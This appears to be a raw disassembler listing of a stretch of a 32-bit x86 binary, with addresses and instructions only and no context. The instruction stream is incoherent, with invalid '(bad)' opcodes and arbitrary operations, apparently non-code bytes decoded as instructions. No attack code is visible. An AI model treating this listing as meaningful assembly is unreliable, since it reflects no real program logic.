  411fd8:	sbb    BYTE PTR [edx],bl
  411fda:	and    BYTE PTR [eax*4-0x5f7edaf0],0x70
  411fe2:	add    BYTE PTR [eax+0x8],0x60
  411fe6:	mov    BYTE PTR [eax],al
  411fe8:	add    BYTE PTR [eax+0x1a61a304],dl
  411fee:	add    BYTE PTR [edx],ah
  411ff0:	and    al,BYTE PTR [eax]
  411ff2:	or     BYTE PTR [edx],al
  411ff4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411ff5:	add    eax,0x48240820
  411ffa:	xchg   edx,eax
  411ffb:	pop    ebx
  411ffc:	or     BYTE PTR [ecx+0x27],dl
  411fff:	add    ah,BYTE PTR [eax]
  412001:	ror    BYTE PTR [eax],0x0
  412004:	add    al,BYTE PTR [edx]
  412006:	adc    al,0x88
  412008:	add    eax,0x9106c204
  41200d:	add    dh,cl
  41200f:	jo     0x412035
  412011:	pusha  
  412012:	inc    ebp
  412013:	inc    ecx
  412014:	sub    al,0x25
  412016:	or     dl,BYTE PTR [eax+eiz*2+0x15480480]
  41201d:	adc    BYTE PTR cs:[eax],0x20
  412021:	cwde   
  412022:	add    BYTE PTR [eax],bl
  412024:	test   DWORD PTR [edx],esi
  412026:	adc    BYTE PTR [eax],dh
  412028:	pusha  
  412029:	retf   0x146
  41202c:	add    al,0x2
  41202e:	and    al,0x23
  412030:	add    BYTE PTR [ecx],cl
  412032:	add    eax,0x2380a
  412037:	arpl   WORD PTR [edx],sp
  412039:	add    eax,0x8c541120
  41203e:	adc    al,BYTE PTR [eax]
  412040:	sub    BYTE PTR [eax],al
  412042:	push   es
  412043:	mov    esi,DWORD PTR [eax+0x50]
  412046:	add    al,0xf8
  412048:	or     BYTE PTR [eax+0x10],ah
  41204b:	and    ah,BYTE PTR [esp+eax*4+0x62]
  41204f:	add    dl,BYTE PTR [eax]
  412051:	dec    ecx
  412052:	add    DWORD PTR [eax],eax
  412054:	or     BYTE PTR ds:0xd4028100,al
  41205a:	adc    BYTE PTR [edx+ebp*1+0x6200c958],dl
  412061:	add    BYTE PTR [eax+0x2c],0x21
  412065:	adc    cl,BYTE PTR [eax]
  412067:	add    BYTE PTR [edx+0x64],ch
  41206a:	add    BYTE PTR [edx+0x22],dl
  41206d:	add    BYTE PTR [edx],dl
  41206f:	and    ch,BYTE PTR [edx-0x30]
  412072:	nop
  412073:	add    DWORD PTR [edx-0x7f],ecx
  412076:	push   edx
  412077:	mov    ah,0x9
  412079:	xchg   BYTE PTR [eax],ah
  41207b:	enter  0x100a,0x1
  41207f:	and    BYTE PTR [edx+edx*1],al
  412082:	sbb    esp,esp
  412084:	or     BYTE PTR [ebx-0x66deffe],al
  41208a:	and    BYTE PTR [eax],al
  41208c:	test   BYTE PTR [ecx+eiz*1+0x18],cl
  412090:	adc    bl,BYTE PTR [edx]
  412092:	add    BYTE PTR [ecx],al
  412094:	add    DWORD PTR [eax],eax
  412096:	adc    DWORD PTR [esp+eax*1],ebp
  412099:	adc    DWORD PTR [eax],eax
  41209b:	nop
  41209c:	or     BYTE PTR [edx],al
  41209e:	adc    DWORD PTR [eax+0x40],ecx
  4120a1:	out    0x88,al
  4120a3:	add    BYTE PTR [eax+ebp*1-0x78],ah
  4120a7:	push   eax
  4120a8:	mov    dl,0x12
  4120aa:	xor    BYTE PTR [eax],0x38
  4120ad:	xor    eax,0x94084405
  4120b2:	add    eax,0xc0e004
  4120b7:	test   DWORD PTR [eax],eax
  4120b9:	add    al,BYTE PTR [ecx]
  4120bb:	sub    al,0x4
  4120bd:	add    al,0xc8
  4120bf:	add    BYTE PTR [eax+eax*1],al
  4120c2:	push   ecx
  4120c3:	or     DWORD PTR [edx],0x228a00
  4120c9:	add    BYTE PTR [ebp+0x40],0x14
  4120cd:	add    al,0x10
  4120cf:	adc    cl,BYTE PTR [eax+0x3a44dc]
  4120d5:	mov    eax,0x32052000
  4120da:	adc    al,0x2
  4120dc:	or     al,0x40
  4120de:	add    BYTE PTR [edx],al
  4120e0:	add    DWORD PTR [esi+0x10510b3],eax
  4120e6:	add    eax,0x80000133
  4120eb:	inc    edx
  4120ec:	add    BYTE PTR [ecx],bl
  4120ee:	lds    eax,FWORD PTR [ebx]
  4120f0:	dec    ebx
  4120f1:	adc    al,0x70
  4120f3:	sbb    BYTE PTR [eax+0x51],cl
  4120f6:	push   eax
  4120f7:	add    BYTE PTR [ecx+0x604480c8],al
  4120fd:	add    BYTE PTR [ecx+edx*4],al
  412100:	inc    eax
  412101:	inc    edx
  412102:	inc    esp
  412103:	mov    BYTE PTR [eax+0x0],al
  412106:	and    al,BYTE PTR [ecx]
  412108:	js     0x412112
  41210a:	add    al,0x83
  41210c:	and    al,al
  41210e:	add    ecx,DWORD PTR [eax]
  412110:	push   0x40
  412112:	loopne 0x412094
  412114:	inc    ebx
  412115:	sbb    al,0x40
  412117:	or     DWORD PTR [ebp+0x0],esp
  41211a:	add    BYTE PTR [edx+ecx*4+0x0],al
  41211e:	stos   BYTE PTR es:[edi],al
  41211f:	pusha  
  412120:	inc    ecx
  412121:	inc    eax
  412122:	add    edx,eax
  412124:	add    BYTE PTR [ebx+0x40],0x8
  412128:	adc    DWORD PTR [eax+0x221c112],0x200d8250
  412132:	add    DWORD PTR [eax],eax
  412134:	and    eax,0x244401c
  412139:	dec    eax
  41213a:	shl    BYTE PTR [ecx+0x127091d4],cl
  412140:	add    BYTE PTR [eax+0x150200c5],0x95
  412147:	and    BYTE PTR [eax],0x26
  41214a:	and    eax,0x531d41c4
  41214f:	adc    DWORD PTR [ebp+0x2],eax
  412152:	js     0x4120d9
  412154:	inc    esp
  412155:	adc    bh,BYTE PTR [eax]
  412157:	mov    BYTE PTR [edx],ch
  412159:	add    BYTE PTR [esi+0x6400aa83],0x0
  412160:	add    edx,DWORD PTR [eax+0xc]
  412163:	and    BYTE PTR [eax],al
  412165:	add    BYTE PTR [eax],0x29
  412168:	or     BYTE PTR [eax+0x20],cl
  41216b:	adc    al,BYTE PTR [eax]
  41216d:	push   cs
  41216e:	sub    dl,BYTE PTR [edx+ecx*1]
  412171:	adc    ah,BYTE PTR [eax-0x7c]
  412174:	add    BYTE PTR [eax],al
  412176:	adc    BYTE PTR [eax+0x16],al
  412179:	xor    DWORD PTR [ecx],eax
  41217b:	shr    BYTE PTR [eax+0x10403204],0x8
  412182:	mov    eax,0x8c112085
  412187:	adc    DWORD PTR [eax+0x5960280],ebx
  41218d:	dec    ecx
  41218e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41218f:	add    BYTE PTR [eax+eiz*1+0x1],al
  412193:	daa    
  412194:	or     dl,BYTE PTR [ebx]
  412196:	push   eax
  412197:	add    al,BYTE PTR [eax-0x30]
  41219a:	adc    BYTE PTR [ecx],cl
  41219c:	add    edx,ebp
  41219e:	inc    edx
  41219f:	add    BYTE PTR [ebx+0x42],al
  4121a2:	add    DWORD PTR [eax],eax
  4121a4:	mov    DWORD PTR [edx],eax
  4121a6:	sbb    ah,BYTE PTR [edx]
  4121a8:	add    eax,0x40001
  4121ad:	or     al,0x40
  4121af:	and    BYTE PTR [eax-0x7f],ch
  4121b2:	add    eax,0x90c84484
  4121b7:	sbb    DWORD PTR [edx+0x20],ecx
  4121ba:	rcl    BYTE PTR [eax],0x1
  4121bd:	dec    eax
  4121be:	xchg   ebp,eax
  4121bf:	inc    ebx
  4121c0:	add    BYTE PTR [ecx],al
  4121c2:	inc    ebx
  4121c3:	add    ah,BYTE PTR [eax+0xd865148]
  4121c9:	add    BYTE PTR [ebp+eax*1+0x34],0x21
  4121ce:	add    al,0x9
  4121d0:	add    BYTE PTR [esp+eax*1],0x0
  4121d4:	pusha  
  4121d5:	push   eax
  4121d6:	mov    eax,0x21100201
  4121db:	xor    BYTE PTR [ebx],dl
  4121dd:	add    BYTE PTR [eax],ah
  4121df:	es add al,al
  4121e2:	add    al,0xb3
  4121e4:	adc    al,0x82
  4121e6:	loopne 0x412170
  4121e8:	sbb    al,al
  4121ea:	push   esp
  4121eb:	mov    al,ds:0xc0c00298
  4121f0:	popa   
  4121f1:	adc    al,0x0
  4121f3:	mov    al,ds:0x30080020
  4121f8:	xor    BYTE PTR [eax+0x2a861048],cl
  4121fe:	dec    eax
  4121ff:	sub    BYTE PTR [eax+eax*1],0x40
  412203:	or     BYTE PTR [esp],dl
  412206:	or     BYTE PTR [eax],al
  412208:	pop    es
  412209:	icebp  
  41220a:	sub    eax,0x94e2a890
  41220f:	or     BYTE PTR [eax+0x0],dh
  412212:	and    eax,DWORD PTR [ecx]
  412214:	add    BYTE PTR [ecx],al
  412216:	add    DWORD PTR [eax+0x81113aa],edx
  41221c:	add    eax,0xd401082c
  412221:	add    al,0x40
  412223:	push   edx
  412224:	pop    ecx
  412225:	cmp    al,BYTE PTR [ecx+0x220e008]
  41222b:	or     BYTE PTR [eax+ecx*1],al
  41222e:	(bad)  
  412230:	add    BYTE PTR [eax+eiz*1],ah
  412233:	add    al,0x60
  412235:	add    DWORD PTR [eax],eax
  412237:	and    BYTE PTR [ecx+eax*1],dh
  41223a:	add    DWORD PTR [eax],ebp
  41223c:	cmp    BYTE PTR [ebx+0x2248a004],ah
  412242:	adc    al,0x40
  412244:	sub    al,0x25
  412246:	add    dl,BYTE PTR [esi+ecx*4+0x5010c28]
  41224d:	add    al,BYTE PTR [ecx+eax*1+0x40020d0]
  412254:	nop
  412255:	push   ecx
  412256:	inc    eax
  412257:	test   BYTE PTR [ecx+0x10],cl
  41225a:	and    BYTE PTR [edx],cl
  41225c:	and    al,al
  41225e:	shr    BYTE PTR [eax],1
  412260:	rol    DWORD PTR [eax-0x80],0x8
  412264:	or     eax,DWORD PTR ds:0x4100a4
  41226a:	add    BYTE PTR [eax],al
  41226c:	pop    es
  41226d:	add    BYTE PTR [ecx+0x86513],al
  412273:	or     al,BYTE PTR [eax+0x0]
  412276:	add    BYTE PTR [esi],cl
  412278:	xor    al,0x2e
  41227a:	add    DWORD PTR [ebx],eax
  41227c:	popa   
  41227d:	xchg   BYTE PTR [ecx],al
  41227f:	inc    eax
  412280:	adc    BYTE PTR [eax-0x7c6df000],ah
  412286:	or     BYTE PTR [ebp+0xa],al
  412289:	add    BYTE PTR [ecx],al
  41228b:	add    BYTE PTR [eax],dh
  41228d:	add    BYTE PTR [eax+eax*1+0x20046810],cl
  412294:	dec    edx
  412295:	pop    ebp
  412296:	inc    eax
  412297:	les    eax,FWORD PTR [esi]
  412299:	add    BYTE PTR ds:0x3211110,cl
  41229f:	or     BYTE PTR [eax+0x58],0x88
  4122a3:	inc    edx
  4122a4:	dec    ecx
  4122a5:	adc    al,al
  4122a7:	inc    ebx
  4122a8:	add    BYTE PTR [ecx],al
  4122aa:	fld    QWORD PTR [eax+eax*1+0x12]
  4122ae:	add    BYTE PTR ds:0x208a2042,ah
  4122b4:	or     BYTE PTR [esi],0x14
  4122b7:	nop
  4122b8:	or     BYTE PTR [eax+0x20],al
  4122bb:	cdq    
  4122bc:	adc    BYTE PTR [eax],0x44
  4122bf:	test   BYTE PTR [esi],al
  4122c1:	jb     0x4122d6
  4122c3:	add    DWORD PTR ds:0x8c0786a,eax
  4122c9:	adc    al,0x8
  4122cb:	dec    esp
  4122cc:	and    BYTE PTR [eax],cl
  4122ce:	jne    0x412320
  4122d0:	or     BYTE PTR [eax],dl
  4122d2:	add    BYTE PTR [edx+ecx*1],al
  4122d5:	inc    ecx
  4122d6:	or     BYTE PTR [ecx],bl
  4122d8:	add    DWORD PTR [eax+eax*2+0x1407702],eax
  4122df:	bound  esi,QWORD PTR [ecx]
  4122e1:	add    BYTE PTR [eax],cl
  4122e3:	add    BYTE PTR [edx],dh
  4122e5:	mov    eax,ds:0x219540b0
  4122ea:	add    dl,BYTE PTR [eax+eiz*4]
  4122ed:	add    BYTE PTR [eax],cl
  4122ef:	sub    DWORD PTR [esi+0x8],ebp
  4122f2:	xchg   BYTE PTR [eax-0x7daf5b00],al
  4122f8:	and    al,0xd
  4122fa:	add    BYTE PTR [eax+0x18],al
  4122fd:	les    eax,FWORD PTR [eax-0x4c]
  412300:	add    al,0x44
  412302:	adc    BYTE PTR [ebx],bl
  412304:	inc    eax
  412305:	adc    BYTE PTR [eax],al
  412307:	push   0xffffff84
  412309:	add    BYTE PTR [eax+0x60],ch
  41230c:	add    BYTE PTR [ecx*1+0x10002038],bl
  412313:	ret    
  412314:	inc    edx
  412315:	and    BYTE PTR [eax+0xe],dl
  412318:	jo     0x4122a3
  41231a:	inc    edx
  41231b:	add    BYTE PTR [edx],cl
  41231d:	add    DWORD PTR [ecx-0xffdf77f],edx
  412323:	cmp    al,BYTE PTR [edx+eax*1+0x2]
  412327:	sbb    BYTE PTR [ebx+0x688c0f0],0x89
  41232e:	add    BYTE PTR [ecx],bl
  412330:	adc    eax,0x26e0aa0
  412335:	call   0x2c08:0x83110448
  41233c:	repnz mov cl,BYTE PTR [eax-0x7dbffbc0]
  412343:	dec    eax
  412344:	inc    ecx
  412345:	inc    ebx
  412346:	or     al,BYTE PTR [eax]
  412348:	add    DWORD PTR [ebx],eax
  41234a:	inc    edx
  41234b:	add    DWORD PTR [edx+0x5],eax
  41234e:	inc    ebx
  41234f:	adc    BYTE PTR [edi+0x0],al
  412352:	adc    cl,BYTE PTR [eax]
  412354:	test   eax,0xe8e4b048
  412359:	cmp    al,0x10
  41235b:	add    BYTE PTR [ecx],cl
  41235d:	add    al,0xdc
  41235f:	push   es
  412360:	add    al,0x2
  412362:	or     BYTE PTR [eax],al
  412364:	add    ah,BYTE PTR [eax+0x46000923]
  41236a:	sub    BYTE PTR [eax+0x480dd416],0x0
  412371:	inc    ecx
  412372:	mov    ah,0x0
  412374:	inc    ecx
  412375:	or     DWORD PTR [ecx],edx
  412377:	and    BYTE PTR [eax+0x861004],ch
  41237d:	or     BYTE PTR [eax-0x7efabefe],dh
  412383:	dec    ecx
  412384:	add    cl,al
  412386:	and    eax,0x880a48a5
  41238b:	xor    cl,BYTE PTR [eax+0x41]
  41238e:	or     DWORD PTR [eax],eax
  412390:	add    DWORD PTR [ecx],edx
  412392:	and    al,0x70
  412394:	and    BYTE PTR [eax],dl
  412396:	or     DWORD PTR [eax-0x7ef6bc00],ecx
  41239c:	cmp    DWORD PTR [eax],ecx
  41239e:	nop
  41239f:	bound  edx,QWORD PTR es:[eax]
  4123a2:	test   DWORD PTR [ecx+0x50],eax
  4123a5:	add    BYTE PTR [ecx+0x25645084],al
  4123ab:	adc    BYTE PTR [ecx+ebx*4+0x16],0x44
  4123b0:	xor    cl,BYTE PTR [eax+edx*4+0x42]
  4123b4:	dec    esp
  4123b5:	push   esp
  4123b6:	mov    ds:0x7104c200,eax
  4123bb:	inc    eax
  4123bc:	and    al,0x40
  4123be:	and    BYTE PTR [edx],al
  4123c0:	add    BYTE PTR [eax+0x56814048],al
  4123c6:	and    al,BYTE PTR [ebp+0x0]
  4123c9:	inc    eax
  4123ca:	ror    BYTE PTR [eax],0x94
  4123cd:	les    eax,FWORD PTR [edx-0x7fff77ff]
  4123d3:	or     BYTE PTR [eax],al
  4123d5:	add    BYTE PTR [eax+eiz*1-0x3f79c000],0x2
  4123dd:	dec    eax
  4123de:	adc    DWORD PTR [eax+0x4140860],eax
  4123e4:	sbb    al,0x0
  4123e6:	pop    eax
  4123e7:	enter  0x1681,0x50
  4123eb:	mov    al,ds:0x58808282
  4123f0:	push   0xe0169208
  4123f5:	xor    BYTE PTR [eax],al
  4123f7:	add    eax,DWORD PTR [eax-0x3fe5dffe]
  4123fd:	inc    eax
  4123fe:	add    DWORD PTR [eax+eiz*1],0x88616d90
  412405:	mov    DWORD PTR [eax],eax
  412407:	popa   
  412408:	inc    esp
  412409:	nop
  41240a:	and    al,0x41
  41240c:	adc    BYTE PTR [esi],al
  41240e:	or     al,0x18
  412410:	adc    DWORD PTR [eax],ecx
  412412:	add    dl,BYTE PTR [ebx+eax*8]
  412415:	jae    0x412447
  412417:	add    al,0xa3
  412419:	gs xor al,0x1
  41241c:	add    al,0x20
  41241e:	and    DWORD PTR [eax-0x35aec5bc],eax
  412424:	dec    ebp
  412425:	or     DWORD PTR [eax],esp
  412427:	mov    al,ds:0x4401e10
  41242c:	sbb    al,0xc0
  41242e:	add    BYTE PTR [ebp+0x2c],al
  412431:	mov    ds:0xb5081d02,al
  412436:	add    eax,0x44000a44
  41243b:	add    eax,0x2387800
  412440:	add    BYTE PTR [eax],al
  412442:	dec    eax
  412443:	add    ch,BYTE PTR [eax]
  412445:	mov    eax,ds:0x4604881
  41244a:	add    al,0x9
  41244c:	adc    BYTE PTR [edx],dh
  41244e:	sub    al,cl
  412450:	adc    BYTE PTR [eax],al
  412452:	add    cl,BYTE PTR [eax]
  412454:	popa   
  412455:	or     DWORD PTR [edx+ebp*1-0x56b8d670],esp
  41245c:	inc    eax
  41245d:	mov    DWORD PTR [ecx+ecx*1],eax
  412460:	pop    DWORD PTR [eax]
  412462:	inc    eax
  412463:	sbb    BYTE PTR [eax-0x7bdf97f0],ah
  412469:	and    BYTE PTR [eax-0x799cbb6c],al
  41246f:	adc    al,0x27
  412471:	or     BYTE PTR [edx],0x6a
  412474:	and    DWORD PTR [eax],0xa024b004
  41247a:	add    al,0x40
  41247c:	add    BYTE PTR [ebx+0x20041120],ah
  412482:	sub    BYTE PTR [edx+0x6],0x43
  412486:	bound  eax,QWORD PTR [eax]
  412488:	mov    BYTE PTR [eax+0x44],dh
  41248b:	and    BYTE PTR [edx+eax*1],0x30
  41248f:	inc    eax
  412490:	add    DWORD PTR [eax+0x62],edx
  412493:	add    esp,DWORD PTR [eax-0x79]
  412496:	or     DWORD PTR [eax-0x75dcf2dc],ecx
  41249c:	or     BYTE PTR [ecx],0x5
  41249f:	inc    ebx
  4124a0:	and    DWORD PTR [eax+0x8],edx
  4124a3:	add    eax,0xb1e20088
  4124a8:	pusha  
  4124a9:	or     dl,0x0
  4124ac:	or     DWORD PTR [eax+0x2015002],0x805d2038
  4124b6:	adc    BYTE PTR [esi],dh
  4124b8:	inc    ebx
  4124b9:	mov    ch,0x80
  4124bb:	sub    dl,BYTE PTR [ecx+eax*1]
  4124be:	inc    eax
  4124bf:	push   ebp
  4124c0:	adc    BYTE PTR [edx],dh
  4124c2:	dec    ecx
  4124c3:	mov    DWORD PTR [eax],eax
  4124c5:	add    ah,BYTE PTR [ebp+0xe]
  4124c8:	sbb    BYTE PTR [edx+eax*1],ah
  4124cb:	or     BYTE PTR [ebp-0x7bdfdb78],al
  4124d1:	add    DWORD PTR [ebx],ecx
  4124d3:	pop    edx
  4124d4:	xor    al,0x8
  4124d6:	or     BYTE PTR [eax+0x62],ah
  4124d9:	or     BYTE PTR [eax+0x41],cl
  4124dc:	or     dl,dl
  4124de:	and    BYTE PTR [ecx],al
  4124e0:	add    DWORD PTR [edx+edi*1],ecx
  4124e3:	and    BYTE PTR [ecx+ecx*4],cl
  4124e6:	dec    esp
  4124e7:	sub    DWORD PTR [eax],eax
  4124e9:	xor    al,0x14
  4124eb:	add    al,0xb2
  4124ed:	jo     0x41250f
  4124ef:	add    DWORD PTR [eax],esp
  4124f1:	sbb    BYTE PTR [eax+0x6],ah
  4124f4:	rol    BYTE PTR [eax+0x800dc4],1
  4124fa:	add    BYTE PTR [eax],al
  4124fc:	add    al,0x49
  4124fe:	test   eax,0x40036024
  412503:	or     BYTE PTR [ebp-0x5c],dl
  412506:	cmp    cl,BYTE PTR [edx-0x60]
  412509:	push   esi
  41250a:	cmp    BYTE PTR [edx],dh
  41250c:	push   eax
  41250d:	or     BYTE PTR [edi+ebp*2],ah
  412510:	and    al,BYTE PTR [eax]
  412512:	dec    eax
  412513:	add    BYTE PTR [ecx+eax*8+0x30840801],0x14
  41251b:	mov    ah,0x8
  41251d:	add    DWORD PTR [eax],eax
  41251f:	mov    al,0x11
  412521:	rol    BYTE PTR [eax-0x7dbfe1f0],0x1c
  412528:	inc    eax
  412529:	xor    BYTE PTR [edx+0x10480600],al
  41252f:	add    al,0xd8
  412531:	loopne 0x4125ad
  412533:	pop    edx
  412534:	and    BYTE PTR [edx+0x41],al
  412537:	adc    BYTE PTR [ecx],al
  412539:	sbb    al,0x8
  41253b:	and    ah,BYTE PTR [eax]
  41253d:	add    BYTE PTR [ebx+edx*1+0x60],cl
  412541:	cmp    DWORD PTR [eax+0x46ac4a8],eax
  412547:	inc    eax
  412548:	or     dl,BYTE PTR [eax]
  41254a:	les    eax,FWORD PTR [edx]
  41254c:	sbb    BYTE PTR [ecx],ch
  41254e:	or     DWORD PTR [eax],esp
  412550:	rol    DWORD PTR [edx+0x40200640],0xc0
  412557:	inc    ebx
  412558:	nop
  412559:	or     BYTE PTR fs:[ecx],al
  41255c:	and    cl,BYTE PTR [eax+eax*1-0x80]
  412560:	inc    esp
  412561:	add    BYTE PTR [ecx],cl
  412563:	inc    eax
  412564:	add    DWORD PTR [eax],ecx
  412566:	xchg   edx,eax
  412567:	or     al,BYTE PTR [ecx-0x5ffffb60]
  41256d:	test   BYTE PTR [eax+0x0],ah
  412570:	or     al,BYTE PTR [edx+0x4a]
  412573:	add    BYTE PTR [edx],al
  412575:	add    BYTE PTR [eax+0x2020414],al
  41257b:	imul   ebp,DWORD PTR [eax+eax*1+0x8002108],0x9823a080
  412586:	adc    DWORD PTR [eax+0x4],0x3860a040
  41258d:	add    BYTE PTR [ecx],al
  41258f:	or     al,0xb0
  412591:	and    BYTE PTR ds:0x18aa2009,al
  412597:	adc    al,BYTE PTR [eax+0x18]
  41259a:	(bad)  
  41259b:	and    BYTE PTR [edx],ah
  41259d:	call   0x3a2:0x4900002a
  4125a4:	mov    al,ds:0x8e260440
  4125a9:	dec    esp
  4125aa:	or     al,BYTE PTR [eax]
  4125ac:	and    DWORD PTR [ecx-0x68],edx
  4125af:	add    BYTE PTR [ecx+0x54818000],dh
  4125b5:	or     BYTE PTR [edx],0x4
  4125b8:	pusha  
  4125b9:	and    DWORD PTR [eax],edx
  4125bb:	mov    al,ds:0xa8200a0
  4125c0:	add    BYTE PTR [eax],al
  4125c2:	and    BYTE PTR [ebx+0x0],al
  4125c5:	shl    BYTE PTR [eax],0x10
  4125c8:	adc    BYTE PTR [edx*1-0x6ebfaf80],al
  4125cf:	enter  0xc980,0x41
  4125d3:	or     BYTE PTR [eax],cl
  4125d5:	sub    BYTE PTR [eax],0x25
  4125d8:	add    DWORD PTR [ecx],edx
  4125da:	add    DWORD PTR [eax+eiz*1],eax
  4125dd:	rol    BYTE PTR [eax],0xc0
  4125e0:	mov    bl,BYTE PTR [eax]
  4125e2:	sbb    dh,BYTE PTR [ecx]
  4125e4:	or     BYTE PTR [edx],0x1
  4125e7:	add    BYTE PTR [eax+eiz*1],ah
  4125ea:	dec    edx
  4125eb:	and    BYTE PTR [ecx],cl
  4125ed:	add    BYTE PTR [ecx+0x44],cl
  4125f0:	and    BYTE PTR [edx-0x1f],ch
  4125f3:	push   eax
  4125f4:	inc    esp
  4125f5:	lods   al,BYTE PTR ds:[esi]
  4125f6:	stos   BYTE PTR es:[edi],al
  4125f7:	dec    eax
  4125f8:	add    al,0x43
  4125fa:	add    eax,0x9124262
  4125ff:	add    cl,BYTE PTR [edx+0x8]
  412602:	mov    sp,0x1a48
  412606:	or     BYTE PTR [ecx],ah
  412608:	inc    ebp
  412609:	and    al,BYTE PTR [ebx]
  41260b:	inc    ebp
  41260c:	mov    BYTE PTR [edx],cl
  41260e:	add    al,BYTE PTR [esi]
  412610:	sub    dl,BYTE PTR [ebx+0x1a]
  412613:	mov    WORD PTR [ecx],fs
  412615:	adc    BYTE PTR [eax],al
  412617:	and    BYTE PTR [eax+eax*1],al
  41261a:	fsub   DWORD PTR [eax+eax*1+0x60]
  41261e:	and    BYTE PTR [eax],cl
  412620:	add    BYTE PTR [eax],cl
  412622:	test   DWORD PTR [edx],eax
  412624:	in     al,0x42
  412626:	and    al,al
  412628:	mov    al,ds:0x2105a136
  41262d:	dec    edx
  41262e:	add    BYTE PTR [eax+eax*1+0x6],0xe8
  412633:	and    BYTE PTR [ecx-0x6dbe9d60],ah
  412639:	mov    BYTE PTR ds:0x6506688,ch
  41263f:	add    al,BYTE PTR [eax]
  412641:	adc    BYTE PTR [edx],bh
  412643:	dec    ebp
  412644:	add    BYTE PTR [eax+0x14],ah
  412647:	add    al,0x42
  412649:	sub    eax,0xe144b88
  41264e:	add    BYTE PTR [ecx],al
  412650:	jo     0x4125d2
  412652:	sub    al,BYTE PTR [edx*4-0x7b7e5fef]
  412659:	adc    DWORD PTR [eax],0x28109000
  41265f:	add    BYTE PTR [eax+0x10],dl
  412662:	pop    esp
  412663:	jb     0x4126b7
  412665:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412666:	push   cs
  412667:	add    al,0x20
  412669:	inc    ebx
  41266a:	sbb    BYTE PTR [eax],dh
  41266c:	sub    al,0x60
  41266e:	add    DWORD PTR [eax+0x58804465],esi
  412674:	rol    BYTE PTR [eax+0x20],1
  412677:	add    DWORD PTR [eax+0x72201600],eax
  41267d:	and    DWORD PTR [ecx],eax
  41267f:	or     DWORD PTR [edx-0x3a],esi
  412682:	and    dl,BYTE PTR [ecx]
  412684:	add    BYTE PTR [edx+0x40],al
  412687:	mov    eax,ds:0x4d0360c
  41268c:	ror    al,1
  41268e:	or     BYTE PTR [edx],0x8e
  412691:	add    BYTE PTR [edx+esi*1],cl
  412694:	mov    edx,DWORD PTR [eax+0x9]
  412697:	xor    BYTE PTR [ecx+0x32000482],cl
  41269d:	add    BYTE PTR [edx],0x8c
  4126a0:	sub    esi,DWORD PTR [eax-0x7a]
  4126a3:	cmp    BYTE PTR [esp+eax*1+0x8420138],dl
  4126aa:	adc    DWORD PTR [eax],ebx
  4126ac:	sub    al,cl
  4126ae:	call   0x40a32fb3
  4126b3:	add    BYTE PTR [ebx],0x1f
  4126b6:	xor    BYTE PTR [eax+0x142034],ah
  4126bc:	fs or  al,0x3
  4126bf:	add    BYTE PTR [eax],0x8a
  4126c2:	sub    eax,0x4139c104
  4126c7:	les    ebp,FWORD PTR [edx+eiz*2]
  4126ca:	add    al,0x40
  4126cc:	inc    eax
  4126cd:	add    BYTE PTR [eax],al
  4126cf:	or     DWORD PTR [eax-0x3f],ecx
  4126d2:	add    BYTE PTR [eax],al
  4126d4:	xor    DWORD PTR [eax+0x6810909],ecx
  4126da:	mov    DWORD PTR [eax],eax
  4126dc:	ret    0xdc34
  4126df:	cdq    
  4126e0:	add    BYTE PTR [ecx],al
  4126e2:	sbb    al,0x6a
  4126e4:	add    BYTE PTR [eax],cl
  4126e6:	push   es
  4126e7:	push   0x4890406
  4126ec:	add    al,0x0
  4126ee:	sub    BYTE PTR [eax],ch
  4126f0:	xchg   DWORD PTR [eax],eax
  4126f2:	leave  
  4126f3:	add    BYTE PTR [eax],ah
  4126f5:	push   eax
  4126f6:	mov    ah,0x4
  4126f8:	add    DWORD PTR [eax],eax
  4126fa:	dec    edi
  4126fb:	inc    edi
  4126fc:	xor    BYTE PTR [esi],al
  4126fe:	add    BYTE PTR [eax],al
  412700:	jo     0x412752
  412702:	mov    al,ds:0xc8c11884
  412707:	or     BYTE PTR [eax+0x41],0x2
  41270b:	nop
  41270c:	add    BYTE PTR ds:0xa269608e,dl
  412712:	adc    BYTE PTR [eax-0x5cf7beeb],0x9
  412719:	or     BYTE PTR [esi],al
  41271b:	nop
  41271c:	and    BYTE PTR [eax],ch
  41271e:	add    BYTE PTR [eax+eax*1+0x0],al
  412722:	test   BYTE PTR [eax],al
  412724:	inc    eax
  412725:	add    al,BYTE PTR [eax]
  412727:	and    BYTE PTR [edx],al
  412729:	rcr    BYTE PTR [esi-0x72ffff76],0x0
  412730:	add    BYTE PTR [eax],dl
  412732:	or     eax,0xa021
  412737:	mov    ds,WORD PTR [edi]
  412739:	adc    ah,BYTE PTR [eax]
  41273b:	inc    eax
  41273c:	rol    BYTE PTR [edx+0x0],0x4
  412740:	push   eax
  412741:	add    BYTE PTR [eax],0xd0
  412744:	inc    eax
  412745:	push   es
  412746:	and    BYTE PTR [eax],bl
  412748:	add    BYTE PTR [eax],al
  41274a:	sbb    BYTE PTR [esp+ebp*4],0x8a
  41274e:	dec    esp
  41274f:	and    eax,0x88810821
  412754:	and    DWORD PTR [edx],edx
  412756:	inc    esp
  412757:	dec    esp
  412758:	sub    al,BYTE PTR [ebx]
  41275a:	add    BYTE PTR [edx+0x4],ah
  41275d:	mov    eax,ds:0xab44938
  412762:	and    al,0x4
  412764:	mov    al,BYTE PTR [ecx+0x19003602]
  41276a:	dec    eax
  41276b:	or     ah,BYTE PTR [eax+0x1840424]
  412771:	mov    BYTE PTR [eax],al
  412773:	and    al,0xa6
  412775:	and    BYTE PTR [eax],al
  412777:	pop    edx
  412778:	add    eax,0xff4aa010
  41277d:	adc    eax,0x435d68
  412782:	adc    BYTE PTR [ebx],ch
  412784:	adc    al,0x74
  412786:	inc    eax
  412787:	xchg   esp,eax
  412788:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412789:	add    BYTE PTR [eax+0x14208404],ah
  41278f:	test   al,0x29
  412791:	inc    esp
  412792:	add    BYTE PTR [ecx+0x4],al
  412795:	(bad)  
  412796:	loopne 0x4127c9
  412798:	sub    eax,DWORD PTR [edx+0x8]
  41279b:	add    BYTE PTR [eax],al
  41279d:	add    al,dl
  41279f:	inc    esp
  4127a0:	inc    esp
  4127a1:	add    BYTE PTR [eax],ch
  4127a3:	push   ebp
  4127a4:	mov    WORD PTR [edx+0x18],es
  4127a7:	or     BYTE PTR [ebx],al
  4127a9:	int3   
  4127aa:	or     BYTE PTR [ecx],al
  4127ac:	push   ecx
  4127ad:	add    BYTE PTR [eax+ecx*2+0x40204410],bl
  4127b4:	sub    al,0x10
